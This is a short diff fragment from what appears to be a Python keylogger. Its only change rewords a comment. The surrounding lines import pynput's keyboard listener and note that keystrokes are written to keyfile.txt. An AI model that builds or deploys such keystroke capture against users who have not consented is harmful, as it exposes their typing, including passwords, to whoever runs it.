@@ -1,4 +1,4 @@
-#Script needs pynput module to import keystrokes.   
+#Script needs pynput library to import keystrokes.   
 from pynput import keyboard
 #  prints keystroke to keyfile.txt. 
 def keyPress(key):
